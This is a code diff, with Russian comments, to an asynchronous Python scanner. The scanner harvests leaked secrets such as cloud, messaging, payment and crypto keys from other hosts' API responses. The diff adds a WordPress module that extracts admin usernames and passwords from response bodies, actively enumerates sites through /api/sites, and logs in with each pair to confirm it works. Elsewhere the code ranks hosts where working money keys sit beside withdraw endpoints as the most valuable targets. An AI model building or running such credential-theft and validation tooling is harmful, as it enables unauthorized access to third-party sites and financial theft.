@@ -23,6 +23,8 @@ from .ai_verify import (
     extract_twilio_pairs,
     extract_twitter_bearers,
     extract_twitter_sessions,
+    extract_wp_creds,
+    probe_wp_sites,
     verify_ai_key,
     verify_aws_keypair,
     verify_cryptopay_key,
@@ -32,6 +34,7 @@ from .ai_verify import (
     verify_twilio_pair,
     verify_twitter_bearer,
     verify_twitter_session,
+    verify_wp_creds,
 )
 from .config import Settings
 from .models import HostRow, CheckResult
@@ -271,6 +274,9 @@ SENSITIVE_PATTERNS = {
 
     # TEST - проверить и удалить ненужные
     "admin_password": re.compile(r'"admin_password"\s*:\s*"[^"]{3,}"', re.I),
+    # WordPress админ-креды в API-ответах (см. extract_wp_creds для пар)
+    "wp_user": re.compile(r'"wp_user"\s*:\s*"[^"]{1,80}"', re.I),
+    "wp_password": re.compile(r'"wp_password"\s*:\s*"[^"]{4,}"', re.I),
     "wp_auth_key": re.compile(r'"(?:auth_key|secure_auth_key|logged_in_key|nonce_key)"\s*:\s*"[^"]{16,}"', re.I),
     "wp_salt": re.compile(r'"(?:auth_salt|secure_auth_salt|logged_in_salt|nonce_salt)"\s*:\s*"[^"]{16,}"', re.I),
     "db_password": re.compile(r'"(?:db_password|DB_PASSWORD)"\s*:\s*"[^"]{3,}"'),
@@ -545,6 +551,8 @@ SEVERITY_MAP = {
     "admin_password": "CRITICAL",
     "wp_auth_key": "HIGH",
     "wp_salt": "HIGH",
+    "wp_password": "CRITICAL",
+    "wp_creds_valid": "CRITICAL",
     "db_password": "CRITICAL",
     # Адрес кошелька сам по себе денег не даёт (нужен ключ) - понижаем
     "wallet_address": "MEDIUM",
@@ -577,7 +585,7 @@ def classify_response(body: str) -> tuple[list[str], str]:
             value_text = m.group(0)
 
             # Для password проверяем что значение не маскировано и не placeholder
-            if name in ("password", "admin_password", "db_password", "smtp_password", "reset_token"):
+            if name in ("password", "admin_password", "db_password", "smtp_password", "reset_token", "wp_password"):
                 val_match = re.search(r'"(\w+)"\s*:\s*"([^"]*)"', value_text)
                 if val_match:
                     field, val = val_match.group(1), val_match.group(2)
@@ -739,6 +747,8 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             exchange_pairs_seen: set[tuple[str, str, str]] = set()
             cryptopay_keys_found: list[dict[str, Any]] = []
             cryptopay_keys_seen: set[tuple] = set()
+            wp_pairs_found: list[dict[str, str]] = []
+            wp_panel_seen: bool = False
 
             # 4. Тестируем эндпоинты
             for path_template, methods in paths.items():
@@ -857,6 +867,12 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                     )
                                 if cfg.secret_checks:
                                     secrets_found.update(extract_secrets(body[:100_000]))
+                                if cfg.wp_checks:
+                                    # маркер + извлечение пар (url можно взять из entry)
+                                    if '"wp_user"' in body or '"wp_password"' in body:
+                                        wp_panel_seen = True
+                                    wp_pairs_found.extend(
+                                        extract_wp_creds(body[:100_000], fallback_url=base_url))
                                 if cfg.twilio_checks:
                                     twilio_pairs_found.update(extract_twilio_pairs(body[:100_000]))
                                 if cfg.twitter_checks:
@@ -1110,6 +1126,40 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                         if severity_order.get(max_severity, 0) < 3:
                             max_severity = "CRITICAL"
 
+            # WordPress finder: креды админок сайтов, найденные в телах
+            # (wp_user/wp_password), плюс активный обход /api/sites (все сайты
+            # одним списком). Верификация read-only GET /wp-json/wp/v2/users/me
+            wp_checks: list[dict[str, Any]] = []
+            if cfg.wp_checks and wp_panel_seen:
+                # активный пробер: /api/sites отдаёт весь список сайтов
+                try:
+                    probed = await probe_wp_sites(
+                        session, base_url, proxy=proxy,
+                        timeout_s=max(cfg.check_timeout, 8),
+                    )
+                    if probed:
+                        wp_pairs_found.extend(probed)
+                except Exception as exc:  # noqa: BLE001 - пробер не должен ломать скан
+                    wp_panel_seen = False
+                    log.debug("wp probe failed: %s", exc)
+
+                seen_pairs: set[tuple[str, str, str]] = set()
+                for e in wp_pairs_found:
+                    sig = (e.get("site_url") or base_url, e.get("user", ""), e.get("password", ""))
+                    if sig not in seen_pairs:
+                        seen_pairs.add(sig)
+                        chk = await verify_wp_creds(
+                            session, sig[0], e["user"], e["password"],
+                            proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
+                        )
+                        wp_checks.append(chk)
+                        if chk["status"] == "valid":
+                            all_patterns.append("wp_creds_valid")
+                            if severity_order.get(max_severity, 0) < 3:
+                                max_severity = "CRITICAL"
+                        if len(wp_checks) >= cfg.wp_verify_max:
+                            break
+
             # Money-корреляция: withdraw-эндпоинты + проверенные денежные
             # ключи на одном хосте = самая ценная цель (деньги и вход в одном месте)
             money_verified = (
@@ -1119,6 +1169,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 or any(c.get("status") == "valid" and c.get("money") for c in telegram_checks)
                 or any(c.get("status") == "valid" and c.get("kind") == "stripe" for c in secret_checks)
                 or any(c.get("status") == "auth_ok" for c in dsn_checks)
+                or any(c.get("status") == "valid" for c in wp_checks)
             )
             if money_verified and any(
                 "withdraw_endpoint" in (ep.get("patterns") or [])
@@ -1171,6 +1222,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "twitter_sessions_total": twitter_sessions_total,
                 "exchange_checks": exchange_checks,
                 "cryptopay_checks": cryptopay_checks,
+                "wp_checks": wp_checks,
             }
 
     except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
